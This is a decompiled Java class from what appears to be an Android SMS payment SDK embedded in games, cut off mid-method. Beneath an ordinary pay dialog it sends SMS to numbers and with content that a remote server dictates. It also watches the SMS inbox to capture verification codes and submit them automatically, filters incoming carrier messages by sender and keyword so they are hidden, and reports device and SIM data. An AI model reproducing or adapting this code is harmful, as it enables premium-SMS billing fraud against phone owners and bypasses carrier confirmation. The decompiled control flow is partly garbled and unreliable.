package com.yl.ml.b;

import android.app.Activity;
import android.app.Dialog;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import com.yl.codelib.comm.App;
import com.yl.codelib.comm.CalFailureUtil;
import com.yl.codelib.comm.MyPreference;
import com.yl.codelib.encryption.DESEncryptor;
import com.yl.codelib.encryption.MD5Encoder;
import com.yl.codelib.sim.SIMUtil;
import com.yl.codelib.utils.CacheFileUtil;
import com.yl.codelib.utils.FileUtil;
import com.yl.codelib.utils.HttpConnent;
import com.yl.codelib.utils.ImageDwloader;
import com.yl.codelib.utils.LogUtil;
import com.yl.codelib.utils.NetWorkUtil;
import com.yl.codelib.utils.OperatorUtil;
import com.yl.codelib.utils.PhoneUtil;
import com.yl.codelib.utils.TextUtil;
import com.yl.codelib.utils.TimeUtil;
import com.yl.ml.common.AppDo;
import com.yl.ml.common.CacheHelper;
import com.yl.ml.date.ConFigFile;
import com.yl.ml.date.PBSmsDBH;
import com.yl.ml.date.PayDetailInfo;
import com.yl.ml.date.PayOtherInfo;
import com.yl.ml.date.Result;
import com.yl.ml.listen.PCallback;
import com.yl.ml.ser.SHService;
import com.yl.ml.thread.DoPayThread;
import com.yl.ml.thread.FanKuiThread;
import com.yl.ml.thread.JiSuanSendSmsThread;
import com.yl.ml.thread.PayThread;
import com.yl.ml.thread.SdkStartInitThread;
import com.yl.ml.view.LoadingDialog;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Map;
import org.json.JSONArray;
import org.json.JSONObject;

public class MA
{
  public static int Order_State = 0;
  public static final String SENT_SMS_ACTION = "SMS_SEND_ACTIOIN";
  private static String V;
  private static int Z = 1;
  private static String aa;
  private static String ab;
  private static String ac = "1";
  private static int ad;
  private static int ae;
  private static ArrayList af = new ArrayList();
  public static int payListNum = 0;
  private Activity S;
  private M T;
  private LoadingDialog U;
  private long W;
  private long X;
  private MyPreference Y;
  private int ag;
  private boolean ah = false;
  int ai = 0;
  private String aj = "";
  
  public MA(Activity paramActivity)
  {
    this.S = paramActivity;
    this.U = new LoadingDialog(paramActivity);
    this.Y = new MyPreference(paramActivity);
  }
  
  private static JSONObject a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    JSONObject localJSONObject = new JSONObject();
    String str2;
    String str1;
    try
    {
      str2 = paramString1.replaceAll(" ", "");
      int i = str2.indexOf("SessionId=") + 10;
      str1 = str2.substring(i, str2.indexOf(";", i)).trim();
      i = str2.indexOf("orderId=") + 8;
      str2 = str2.substring(i, str2.indexOf(";", i)).trim();
      paramString1 = new JSONObject(paramString1).getString("ReturnCode");
    }
    catch (Exception paramString2)
    {
      try
      {
        paramString1 = new StringBuilder();
        paramString1.append("&paycode=").append(paramString4).append("&sss=").append(str1).append("&order=").append(str2).append("&msisdn=").append(paramString3);
        paramString1 = HttpConnent.doHttpGet(paramString2 + paramString1.toString(), 0);
        if ((paramString1 != null) && (!"".equals(paramString1))) {
          break label262;
        }
        localJSONObject.put("resultCode", "9918");
        localJSONObject.put("resultDescription", "请求验证码无响应");
        return localJSONObject;
      }
      catch (Exception paramString1)
      {
        LogUtil.v(Log.getStackTraceString(paramString1));
        return localJSONObject;
      }
      paramString2 = paramString2;
      if (paramString1.contains("应用信息无效"))
      {
        localJSONObject.put("resultCode", "9997");
        localJSONObject.put("resultDescription", "应用信息无效");
        return localJSONObject;
      }
      localJSONObject.put("resultCode", "9999");
      localJSONObject.put("resultDescription", "未知de错误");
      return localJSONObject;
    }
    label262:
    if ("0".equals(paramString1))
    {
      paramString1 = new JSONObject();
      paramString1.put("sessionId", str1);
      paramString1.put("payCode", paramString4);
      paramString1.put("orderId", str2);
      paramString1.put("phone", paramString3);
      localJSONObject.put("resultCode", "0000");
      localJSONObject.put("resultDescription", "success");
      localJSONObject.put("backParam", paramString1);
      return localJSONObject;
    }
    if ("4006".equals(paramString1))
    {
      localJSONObject.put("resultCode", "9991");
      localJSONObject.put("resultDescription", "手机号码错误");
      return localJSONObject;
    }
    if ("4001".equals(paramString1))
    {
      localJSONObject.put("resultCode", "9993");
      localJSONObject.put("resultDescription", "计费点无效");
      return localJSONObject;
    }
    if ("4004".equals(paramString1))
    {
      localJSONObject.put("resultCode", "9001");
      localJSONObject.put("resultDescription", "会话失效");
      return localJSONObject;
    }
    localJSONObject.put("resultCode", "9999");
    localJSONObject.put("resultDescription", "未知错误");
    return localJSONObject;
  }
  
  private void a(int paramInt, PayDetailInfo paramPayDetailInfo)
  {
    Dialog localDialog = new Dialog(this.S, App.getIdByName(this.S, "style", "mili_smspay_dialog"));
    Object localObject = LayoutInflater.from(this.S).inflate(App.getIdByName(this.S, "layout", "mili_smspay_end_dialog"), null);
    localDialog.show();
    localDialog.setCancelable(false);
    localDialog.setContentView((View)localObject);
    TextView localTextView1 = (TextView)((View)localObject).findViewById(App.getIdByName(this.S, "id", "msmpay_end_tv_title"));
    TextView localTextView2 = (TextView)((View)localObject).findViewById(App.getIdByName(this.S, "id", "msmpay_end_tv_ms"));
    Button localButton = (Button)((View)localObject).findViewById(App.getIdByName(this.S, "id", "msmpay_end_btn_ok"));
    LinearLayout localLinearLayout = (LinearLayout)((View)localObject).findViewById(App.getIdByName(this.S, "id", "msmpay_end_lin_la"));
    localObject = (ImageView)((View)localObject).findViewById(App.getIdByName(this.S, "id", "msmpay_end_img_tis"));
    if (paramInt == 9000)
    {
      localTextView1.setText("支付成功");
      localTextView2.setText("话费扣取成功,请及时查收购买的商品.");
    }
    for (;;)
    {
      if ((paramPayDetailInfo != null) && (paramPayDetailInfo.getPayEndSwitch() == 1))
      {
        localLinearLayout.setVisibility(0);
        ((ImageView)localObject).setVisibility(0);
        new ImageDwloader().imageDwload(paramPayDetailInfo.getPayEndImgUrl(), this.S, new E(this, (ImageView)localObject), 0);
        ((ImageView)localObject).setOnClickListener(new F(this, paramPayDetailInfo));
      }
      localButton.setOnClickListener(new G(this, localDialog));
      localDialog.show();
      return;
      localTextView1.setText("支付失败");
      localTextView2.setText("话费扣取失败，请确认已关闭短信拦截功能.");
    }
  }
  
  private void a(int paramInt1, PayDetailInfo paramPayDetailInfo, int paramInt2)
  {
    String str1 = TimeUtil.getNowTimeNum();
    Map localMap = AppDo.getUserBaseDeviceInfo(this.S);
    String str2 = paramPayDetailInfo.getStringNo();
    if (str2.startsWith("LOCAL")) {
      localMap.put("money", this.ag);
    }
    localMap.put("stringNo", str2);
    localMap.put("state", paramInt1);
    localMap.put("passId", paramPayDetailInfo.getPassId());
    localMap.put("spId", paramPayDetailInfo.getSpId());
    localMap.put("createTime", str1);
    localMap.put("yys", paramPayDetailInfo.getPayOtherInfo().getYys());
    localMap.put("isOnly", paramPayDetailInfo.getIsOnly());
    localMap.put("payId", V);
    localMap.put("payCostTime", this.X);
    if (paramInt2 == 0)
    {
      localMap.put("errorCode", "");
      localMap.put("errorInfo", "");
    }
    for (;;)
    {
      if (TextUtil.notNull(aa)) {
        localMap.put("orderNum", aa);
      }
      new Thread(new FanKuiThread(this.S, null, localMap)).start();
      return;
      localMap.put("errorCode", paramInt2);
      localMap.put("errorInfo", Result.getPayErrorLog(paramInt2));
    }
  }
  
  private void a(Activity paramActivity, PayDetailInfo paramPayDetailInfo, PCallback paramPCallback)
  {
    Dialog localDialog = new Dialog(paramActivity, App.getIdByName(paramActivity, "style", "mili_smspay_dialog"));
    Object localObject2 = LayoutInflater.from(paramActivity).inflate(App.getIdByName(paramActivity, "layout", "mili_smspay_pay_dialog"), null);
    localDialog.show();
    localDialog.setCancelable(false);
    localDialog.setContentView((View)localObject2);
    Object localObject1 = paramPayDetailInfo.getPayOtherInfo();
    Button localButton = (Button)((View)localObject2).findViewById(App.getIdByName(paramActivity, "id", "btn_pay_sure"));
    localButton.setClickable(true);
    localButton.setEnabled(true);
    ImageView localImageView = (ImageView)((View)localObject2).findViewById(App.getIdByName(paramActivity, "id", "btn_close"));
    Object localObject4 = (TextView)((View)localObject2).findViewById(App.getIdByName(paramActivity, "id", "tv_smspay_price"));
    Object localObject5 = (TextView)((View)localObject2).findViewById(App.getIdByName(paramActivity, "id", "tv_smspay_payname"));
    TextView localTextView = (TextView)((View)localObject2).findViewById(App.getIdByName(paramActivity, "id", "tv_smspay_cpname"));
    Object localObject3 = (TextView)((View)localObject2).findViewById(App.getIdByName(paramActivity, "id", "tv_smspay_phonenum"));
    localObject2 = (TextView)((View)localObject2).findViewById(App.getIdByName(paramActivity, "id", "tv_smspay_ms"));
    if (localObject1 != null)
    {
      ((TextView)localObject4).setText("支付话费：" + ((PayOtherInfo)localObject1).getMoney() + "元");
      ((TextView)localObject5).setText("道具名称：" + ((PayOtherInfo)localObject1).getPayDetail());
      localTextView.setText("游戏名称：" + ((PayOtherInfo)localObject1).getCpName());
      localObject4 = ((PayOtherInfo)localObject1).getOrderDetail();
      localObject5 = this.Y.readString("Service_Num", "4006-571-610");
      ((TextView)localObject3).setText("客服电话：" + (String)localObject5);
      localObject3 = "支付通道：本次支付您将使用由" + ab + "与" + ((PayOtherInfo)localObject1).getSpName();
      localObject1 = "联合提供的“" + ((PayOtherInfo)localObject1).getChannelName() + "”业务通道，资费" + ((PayOtherInfo)localObject1).getMoney() + "元。";
      if (!TextUtil.notNull((String)localObject4)) {
        break label479;
      }
      ((TextView)localObject2).setText((CharSequence)localObject4);
    }
    for (;;)
    {
      localButton.setOnClickListener(new b(this, localDialog, paramPayDetailInfo, localButton, paramPCallback));
      localImageView.setOnClickListener(new d(this, paramPayDetailInfo, localDialog, paramPCallback, paramActivity));
      return;
      label479:
      ((TextView)localObject2).setText(localObject3 + (String)localObject1);
    }
  }
  
  private void a(PayDetailInfo paramPayDetailInfo, int paramInt, PCallback paramPCallback)
  {
    if (paramInt == 9000)
    {
      if (paramPayDetailInfo.getStringNo().startsWith("LOCAL")) {
        CacheFileUtil.putInt("localMaxValue", CacheFileUtil.getInt("localMaxValue", this.S) + this.ag, this.S);
      }
      a(2, paramPayDetailInfo, paramInt);
    }
    for (int i = 1;; i = 0)
    {
      b();
      if (i == 0) {
        break label251;
      }
      if (ad != ae) {
        break label125;
      }
      if (paramPayDetailInfo.getPayOtherInfo().getPayMode() != 1) {
        break;
      }
      a(paramPCallback, V, paramPayDetailInfo, 9000, 1);
      return;
      a(1, paramPayDetailInfo, paramInt);
    }
    a(paramPCallback, V, paramPayDetailInfo, 9000, 4);
    return;
    label125:
    if (ac.equals("2"))
    {
      LogUtil.v("第一次成功了!");
      this.ah = true;
      AppDo.errorRecord(this.S, paramInt, V, paramPayDetailInfo, aa);
      if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1) {
        this.U.show("正在处理中，请稍等片刻...");
      }
      new Thread(new A(this, new z(this, paramPCallback))).start();
      return;
    }
    if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1)
    {
      a(paramPCallback, V, paramPayDetailInfo, 9000, 1);
      return;
    }
    a(paramPCallback, V, paramPayDetailInfo, 9000, 4);
    return;
    label251:
    if (ac.equals("2"))
    {
      if (ad == ae)
      {
        if (this.ah)
        {
          if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1)
          {
            a(paramPCallback, V, paramPayDetailInfo, 9000, 1);
            return;
          }
          a(paramPCallback, V, paramPayDetailInfo, 9000, 4);
          return;
        }
        if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1)
        {
          a(paramPCallback, V, paramPayDetailInfo, paramInt, 1);
          return;
        }
        a(paramPCallback, V, paramPayDetailInfo, paramInt, 4);
        return;
      }
      this.ah = false;
      if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1)
      {
        a(paramPCallback, V, paramPayDetailInfo, paramInt, 1);
        return;
      }
      a(paramPCallback, V, paramPayDetailInfo, paramInt, 4);
      return;
    }
    LogUtil.v("===" + ae + "-----" + ad);
    if (ae < ad)
    {
      AppDo.errorRecord(this.S, paramInt, V, paramPayDetailInfo, aa);
      if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1) {
        this.U.show("正在处理中，请稍等片刻...");
      }
      a((PayDetailInfo)af.get(ae), paramPCallback);
      return;
    }
    if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1)
    {
      a(paramPCallback, V, paramPayDetailInfo, paramInt, 1);
      return;
    }
    a(paramPCallback, V, paramPayDetailInfo, paramInt, 4);
  }
  
  private void a(PayDetailInfo paramPayDetailInfo, PCallback paramPCallback)
  {
    ae += 1;
    paramPayDetailInfo.setNowBu(0);
    Object localObject1 = paramPayDetailInfo.getSmsPreventC();
    if (TextUtil.notNull((String)localObject1)) {
      new PBSmsDBH(this.S).deleteFromPassId(paramPayDetailInfo.getPassId());
    }
    for (;;)
    {
      try
      {
        localObject1 = new JSONArray((String)localObject1);
        if (((JSONArray)localObject1).length() > 0)
        {
          i = 0;
          int j = ((JSONArray)localObject1).length();
          if (i < j) {
            continue;
          }
        }
      }
      catch (Exception localException)
      {
        int i;
        Object localObject2;
        String str;
        Intent localIntent;
        continue;
      }
      localObject1 = paramPayDetailInfo.getSmArray();
      if ((localObject1 == null) || (((JSONArray)localObject1).length() <= 0)) {
        continue;
      }
      a((JSONArray)localObject1, 0, paramPayDetailInfo, paramPCallback);
      return;
      localObject2 = ((JSONArray)localObject1).getJSONObject(i);
      str = ((JSONObject)localObject2).getString("filterSpnumber");
      localObject2 = ((JSONObject)localObject2).getString("keyword");
      localIntent = new Intent(this.S, SHService.class);
      localIntent.setAction("com.yl.mp.ShService.add");
      localIntent.putExtra("phonenum", str);
      localIntent.putExtra("keyone", (String)localObject2);
      localIntent.putExtra("passid", paramPayDetailInfo.getPassId());
      this.S.startService(localIntent);
      i += 1;
    }
    a(paramPayDetailInfo, 7002, paramPCallback);
  }
  
  private void a(PayDetailInfo paramPayDetailInfo, PCallback paramPCallback, String paramString)
  {
    this.aj = "";
    String str1 = paramPayDetailInfo.getFilterVerifSpnumber();
    String str2 = paramPayDetailInfo.getFilterVerifHeadContent();
    String str3 = paramPayDetailInfo.getFilterVerifEndContent();
    paramPCallback = new P(this, new Handler(), this.S, str1, new q(this, paramPayDetailInfo, paramPCallback), System.currentTimeMillis(), str2, str3);
    this.S.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, paramPCallback);
    if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1) {
      this.U.show("正在处理中，请稍等片刻...");
    }
    new Thread(new t(this, paramString)).start();
  }
  
  private void a(PayDetailInfo paramPayDetailInfo, PCallback paramPCallback, String paramString1, String paramString2)
  {
    String str1 = paramPayDetailInfo.getFilterVerifSpnumber();
    String str2 = paramPayDetailInfo.getFilterVerifHeadContent();
    String str3 = paramPayDetailInfo.getFilterVerifEndContent();
    LogUtil.v(str1 + "reyzmphonenum");
    LogUtil.v(str2 + "yzmkey");
    LogUtil.v(str3 + "endyzmkey");
    paramPayDetailInfo = new P(this, new Handler(), this.S, str1, new y(this, paramString1, paramString2, paramPayDetailInfo, paramPCallback), System.currentTimeMillis(), str2, str3);
    this.S.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, paramPayDetailInfo);
  }
  
  private void a(PCallback paramPCallback, String paramString)
  {
    if (TextUtil.notNull(this.Y.readString("province", "")))
    {
      b(paramPCallback, paramString);
      return;
    }
    paramPCallback = new H(this, paramPCallback, paramString);
    this.U.show("正在通信中，请稍等片刻...");
    paramString = AppDo.getUserBaseDeviceInfo(this.S);
    new Thread(new SdkStartInitThread(ConFigFile.Url_JSMain + "/initMobileInfoapiInitMobile.do", this.S, paramPCallback, paramString)).start();
  }
  
  private void a(PCallback paramPCallback, String paramString, PayDetailInfo paramPayDetailInfo, int paramInt1, int paramInt2)
  {
    this.U.dismiss();
    if ((paramPayDetailInfo != null) && (paramInt1 == 9000) && (paramInt2 != 4) && (paramPayDetailInfo.getInterval() != 0)) {
      CalFailureUtil.setKeyTime(paramPayDetailInfo.getCodeId(), paramPayDetailInfo.getInterval() * 1000);
    }
    if (paramInt2 == 1)
    {
      paramPCallback.payEnd(paramInt1);
      payListNum = 0;
      AppDo.errorRecord(this.S, paramInt1, paramString, paramPayDetailInfo, aa);
      if (Z != 0) {
        a(paramInt1, paramPayDetailInfo);
      }
      if (paramInt1 == 9000) {
        Toast.makeText(this.S, "支付成功", 1).show();
      }
    }
    do
    {
      do
      {
        return;
        if (paramInt2 != 2) {
          break;
        }
        paramPCallback.payEnd(paramInt1);
      } while (Z == 0);
      a(paramInt1, paramPayDetailInfo);
      return;
      if (paramInt2 == 3)
      {
        if (Z != 0) {
          a(paramInt1, paramPayDetailInfo);
        }
        paramPCallback.payEnd(paramInt1);
        payListNum = 0;
        return;
      }
    } while (paramInt2 != 4);
    payListNum = 0;
    AppDo.errorRecord(this.S, paramInt1, paramString, paramPayDetailInfo, aa);
  }
  
  private void a(JSONArray paramJSONArray, int paramInt, PayDetailInfo paramPayDetailInfo, PCallback paramPCallback)
  {
    for (;;)
    {
      Object localObject2;
      Object localObject3;
      String str1;
      Object localObject4;
      String str2;
      try
      {
        if (paramInt >= paramJSONArray.length()) {
          return;
        }
        localObject2 = paramJSONArray.getJSONObject(paramInt);
        localObject1 = ((JSONObject)localObject2).getString("type");
        if (!((String)localObject1).equals("sendMsg")) {
          break label636;
        }
        if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1) {
          this.U.show("正在处理中，请稍等片刻...");
        }
        localObject1 = ((JSONObject)localObject2).getString("smsContent");
        localObject2 = ((JSONObject)localObject2).getString("smsSend");
        paramJSONArray = (JSONArray)localObject1;
        if (paramPayDetailInfo.getSpId().equals("20127"))
        {
          paramJSONArray = (JSONArray)localObject1;
          if (((String)localObject1).length() < 10)
          {
            paramJSONArray = new SimpleDateFormat("mmss").format(new Date());
            localObject3 = "YLAD" + System.currentTimeMillis();
            str1 = DESEncryptor.getDec(this.Y.readString("Ado_CNAME", "hangzhouyl"));
            localObject4 = DESEncryptor.getDec(this.Y.readString("Ado_CM", "M3570023"));
            str2 = MD5Encoder.EncoderByMd5_End16(str1 + (String)localObject1 + (String)localObject3 + paramJSONArray + "DD" + (String)localObject1);
            paramJSONArray = str1 + "," + (String)localObject1 + "," + (String)localObject3 + "," + paramJSONArray + "," + str2 + "," + (String)localObject4;
          }
        }
        if ((!TextUtil.notNull(paramJSONArray)) || (!TextUtil.notNull((String)localObject2)))
        {
          a(paramPayDetailInfo, 7003, paramPCallback);
          return;
        }
      }
      catch (Exception paramJSONArray)
      {
        a(paramPayDetailInfo, 7010, paramPCallback);
        return;
      }
      if ((paramJSONArray.equals("-1")) || (((String)localObject2).equals("-1")))
      {
        a(paramPayDetailInfo, 7003, paramPCallback);
        return;
      }
      paramPayDetailInfo.setNowBu(paramInt + 1);
      paramJSONArray = URLDecoder.decode(paramJSONArray, "utf-8");
      if (paramPayDetailInfo.getSpId().equals("20127")) {
        if (paramJSONArray.contains("|"))
        {
          if (paramJSONArray.split("\\|").length != 6) {
            a(paramPayDetailInfo, 8004, paramPCallback);
          }
        }
        else if (paramJSONArray.contains(","))
        {
          if (paramJSONArray.split(",").length != 6) {
            a(paramPayDetailInfo, 8004, paramPCallback);
          }
        }
        else if ((paramJSONArray.contains(";")) && (paramJSONArray.split(";").length != 6))
        {
          a(paramPayDetailInfo, 8004, paramPCallback);
          return;
        }
      }
      Object localObject1 = AppDo.getUserBaseDeviceInfo(this.S);
      ((Map)localObject1).put("status", "10");
      ((Map)localObject1).put("fee", paramPayDetailInfo.getPassId());
      ((Map)localObject1).put("orderNo", paramPayDetailInfo.getStringNo());
      ((Map)localObject1).put("yys", OperatorUtil.getOperatorType(SIMUtil.getIMSI2(this.S), NetWorkUtil.getNetWork(this.S), null));
      new Thread(new JiSuanSendSmsThread(null, (Map)localObject1)).start();
      b(this.S, paramPayDetailInfo, paramPCallback);
      SIMUtil.sendSmsMessage(this.S, (String)localObject2, paramJSONArray, null);
      return;
      label636:
      if (((String)localObject1).equals("sendMsg2"))
      {
        if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1) {
          this.U.show("正在处理中，请稍等片刻...");
        }
        localObject3 = ((JSONObject)localObject2).getString("smsContent");
        localObject1 = ((JSONObject)localObject2).getString("smsSend");
        if ((((String)localObject3).equals("-1")) || (((String)localObject1).equals("-1")))
        {
          a(paramPayDetailInfo, 7003, paramPCallback);
          return;
        }
        paramPayDetailInfo.setNowBu(paramInt + 1);
        localObject2 = URLDecoder.decode((String)localObject3, "utf-8");
        localObject3 = AppDo.getUserBaseDeviceInfo(this.S);
        ((Map)localObject3).put("status", "10");
        ((Map)localObject3).put("fee", paramPayDetailInfo.getPassId());
        ((Map)localObject3).put("orderNo", paramPayDetailInfo.getStringNo());
        ((Map)localObject3).put("yys", OperatorUtil.getOperatorType(SIMUtil.getIMSI2(this.S), NetWorkUtil.getNetWork(this.S), null));
        new Thread(new JiSuanSendSmsThread(null, (Map)localObject3)).start();
        b(this.S, paramPayDetailInfo, paramPCallback);
        SIMUtil.sendSmsMessage2(this.S, (String)localObject1, (String)localObject2, null);
      }
      else
      {
        if (((String)localObject1).equals("rys"))
        {
          if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1) {
            this.U.show("正在处理中，请稍等片刻...");
          }
          paramJSONArray = ((JSONObject)localObject2).getString("smsContent");
          localObject1 = ((JSONObject)localObject2).getString("smsSend");
          paramPayDetailInfo.setNowBu(paramInt + 1);
          a(paramPayDetailInfo, paramPCallback, (String)localObject1, paramJSONArray);
          return;
        }
        if (((String)localObject1).equals("cmread"))
        {
          paramJSONArray = ((JSONObject)localObject2).getString("bookPayType");
          localObject1 = ((JSONObject)localObject2).getString("cmreadurl");
          boolean bool = TextUtil.notNull((String)localObject1);
          if (bool) {
            try
            {
              new Thread(new D(this, paramJSONArray, (String)localObject1, new C(this, paramPayDetailInfo, paramPCallback))).start();
              return;
            }
            catch (Exception paramJSONArray)
            {
              a(paramPayDetailInfo, 4006, paramPCallback);
              return;
            }
          }
          a(paramPayDetailInfo, 7001, paramPCallback);
          return;
        }
        if (((String)localObject1).equals("wait"))
        {
          localObject1 = ((JSONObject)localObject2).getString("waitTime");
          paramJSONArray = new e(this, paramJSONArray, paramInt + 1, paramPayDetailInfo, paramPCallback);
          if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1) {
            this.U.show("正在处理中，请稍等片刻...");
          }
          new Thread(new f(this, (String)localObject1, paramJSONArray)).start();
          return;
        }
        if (((String)localObject1).equals("post"))
        {
          paramJSONArray = ((JSONObject)localObject2).getString("postUrl");
          LogUtil.v(paramJSONArray);
          localObject1 = ((JSONObject)localObject2).getString("param1");
          localObject1 = new g(this, paramPayDetailInfo, paramInt + 1, ((JSONObject)localObject2).getString("param2"), (String)localObject1, paramPCallback);
          if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1) {
            this.U.show("正在处理中，请稍等片刻...");
          }
          new Thread(new h(this, paramJSONArray, (Handler)localObject1)).start();
          return;
        }
        if (((String)localObject1).equals("psp"))
        {
          localObject1 = ((JSONObject)localObject2).getString("pspurl");
          paramJSONArray = null;
          if (((JSONObject)localObject2).has("pspurl1")) {
            paramJSONArray = ((JSONObject)localObject2).getString("pspurl1");
          }
          localObject2 = NetWorkUtil.getNetWork(this.S);
          if (TextUtil.notNull((String)localObject2))
          {
            if ((!((String)localObject2).equals("WIFI")) && (!((String)localObject2).equals("wifi")) && (TextUtil.notNull(paramJSONArray)))
            {
              LogUtil.v("doadowap");
              new Thread(new p(this, paramJSONArray, new o(this, paramPayDetailInfo, paramPCallback, (String)localObject1))).start();
              return;
            }
            a(paramPayDetailInfo, paramPCallback, (String)localObject1);
            return;
          }
          a(paramPayDetailInfo, 40048, paramPCallback);
          return;
        }
        if (((String)localObject1).equals("psp2"))
        {
          paramJSONArray = ((JSONObject)localObject2).getString("pspurl2");
          localObject1 = ((JSONObject)localObject2).getString("request_url");
          localObject3 = ((JSONObject)localObject2).getString("submit_url");
          str1 = ((JSONObject)localObject2).getString("phonenum");
          localObject2 = ((JSONObject)localObject2).getString("paycode");
          if (TextUtil.notNull(NetWorkUtil.getNetWork(this.S)))
          {
            this.aj = "";
            localObject4 = paramPayDetailInfo.getFilterVerifSpnumber();
            str2 = paramPayDetailInfo.getFilterVerifHeadContent();
            String str3 = paramPayDetailInfo.getFilterVerifEndContent();
            localObject4 = new P(this, new Handler(), this.S, (String)localObject4, new u(this, paramPayDetailInfo, paramPCallback, (String)localObject3), System.currentTimeMillis(), str2, str3);
            this.S.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, (ContentObserver)localObject4);
            if (paramPayDetailInfo.getPayOtherInfo().getPayMode() == 1) {
              this.U.show("正在处理中，请稍等片刻...");
            }
            new Thread(new x(this, paramJSONArray, (String)localObject1, (String)localObject3, str1, (String)localObject2)).start();
            return;
          }
          a(paramPayDetailInfo, 40048, paramPCallback);
          return;
        }
        if (((String)localObject1).equals("ps"))
        {
          paramPayDetailInfo.setNowBu(paramInt + 1);
          paramJSONArray = NetWorkUtil.getNetWork(this.S);
          localObject1 = ((JSONObject)localObject2).getString("pspurl");
          if (TextUtil.notNull(paramJSONArray))
          {
            new Thread(new n(this, (String)localObject1)).start();
            a(paramPayDetailInfo, paramPCallback, null, null);
            return;
          }
          a(paramPayDetailInfo, 40048, paramPCallback);
          return;
        }
        if (((String)localObject1).equals("post2"))
        {
          paramPayDetailInfo.setNowBu(paramInt + 1);
          paramJSONArray = ((JSONObject)localObject2).getString("postUrl");
          if (TextUtil.notNull(paramJSONArray)) {
            new Thread(new i(this, paramJSONArray)).start();
          }
          if (paramPayDetailInfo.getNowBu() == paramPayDetailInfo.getSmArray().length()) {
            a(paramPayDetailInfo, 9000, paramPCallback);
          }
        }
        else
        {
          if (((String)localObject1).equals("post3"))
          {
            paramJSONArray = ((JSONObject)localObject2).getString("posturl");
            if (TextUtil.notNull(paramJSONArray))
            {
              new Thread(new k(this, paramJSONArray, new j(this, paramPayDetailInfo, paramPCallback))).start();
              return;
            }
            a(paramPayDetailInfo, 40077, paramPCallback);
            return;
          }
          if (((String)localObject1).equals("postxml"))
          {
            paramPayDetailInfo.setNowBu(paramInt + 1);
            paramJSONArray = ((JSONObject)localObject2).getString("postUrl");
            localObject1 = ((JSONObject)localObject2).getString("xml");
            localObject2 = URLDecoder.decode((String)localObject1, "utf-8");
            LogUtil.v((String)localObject2);
            if ((TextUtil.notNull(paramJSONArray)) && (TextUtil.notNull((String)localObject1))) {
              new Thread(new l(this, paramJSONArray, (String)localObject2)).start();
            }
            if (paramPayDetailInfo.getNowBu() == paramPayDetailInfo.getSmArray().length()) {
              a(paramPayDetailInfo, 9000, paramPCallback);
            }
          }
          else
          {
            a(paramPayDetailInfo, 7009, paramPCallback);
            break label1955;
          }
        }
        return;
      }
      label1955:
      paramInt += 1;
    }
  }
  
  private void b()
  {
    LogUtil.v("被干掉了广播");
    try
    {
      this.S.unregisterReceiver(this.T);
      return;
    }
    catch (Exception localException) {}
  }
  
  private void b(Activity paramActivity, PayDetailInfo paramPayDetailInfo, PCallback paramPCallback)
  {
    LogUtil.v("注册了发送短信的广播!");
    this.T = new M(this, paramPayDetailInfo, paramPCallback);
    paramPayDetailInfo = new IntentFilter();
    paramPayDetailInfo.setPriority(Integer.MAX_VALUE);
    paramPayDetailInfo.addAction("SMS_SEND_ACTIOIN");
    paramActivity.registerReceiver(this.T, paramPayDetailInfo);
  }
  
  private void b(PCallback paramPCallback, String paramString)
  {
    String str1 = AppDo.getAppID(this.S);
    Object localObject = AppDo.getAppChannel(this.S);
    String str2 = MD5Encoder.EncoderByMd5(str1 + (String)localObject + paramString);
    localObject = AppDo.getUserBaseDeviceInfo(this.S);
    CalFailureUtil.cleanFailureInfo();
    ((Map)localObject).put("codeId", CalFailureUtil.getKeys());
    ((Map)localObject).put("appId", str1);
    if (TextUtil.notNull(aa)) {
      ((Map)localObject).put("orderNum", aa);
    }
    ((Map)localObject).put("packageName", AppDo.getAppPackageName(this.S));
    ((Map)localObject).put("sign", str2);
    ((Map)localObject).put("payId", paramString);
    if (paramString.startsWith("price#")) {
      ((Map)localObject).put("payFee", paramString.replace("price#", ""));
    }
    int i = CacheHelper.caCheAvailability_Local(this.S, "error_channel.info", 0L);
    str1 = null;
    switch (i)
    {
    }
    for (;;)
    {
      if (TextUtil.notNull(str1)) {
        ((Map)localObject).put("passId", str1);
      }
      paramPCallback = new L(this, paramPCallback, paramString);
      this.U.show("正在通信中，请稍等片刻...");
      new Thread(new PayThread(paramPCallback, (Map)localObject)).start();
      return;
      str1 = FileUtil.readDateFile("error_channel.info", this.S);
    }
  }
  
  public static JSONObject submitVerifyCode(String paramString1, JSONObject paramJSONObject, String paramString2)
  {
    JSONObject localJSONObject = new JSONObject();
    try
    {
      String str1 = paramJSONObject.getString("sessionId");
      String str2 = paramJSONObject.getString("payCode");
      String str3 = paramJSONObject.getString("orderId");
      paramJSONObject = paramJSONObject.getString("phone");
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("&paycode=").append(str2).append("&sss=").append(str1).append("&order=").append(str3).append("&msisdn=").append(paramJSONObject).append("&checkcode=").append(paramString2);
      paramString1 = HttpConnent.doHttpGet(paramString1 + localStringBuilder.toString(), 0);
      if ((paramString1 == null) || ("".equals(paramString1)))
      {
        localJSONObject.put("resultCode", "9998");
        localJSONObject.put("resultDescription", "请求验证码无响应");
        return localJSONObject;
      }
      paramString1 = new JSONObject(paramString1).getString("ReturnCode");
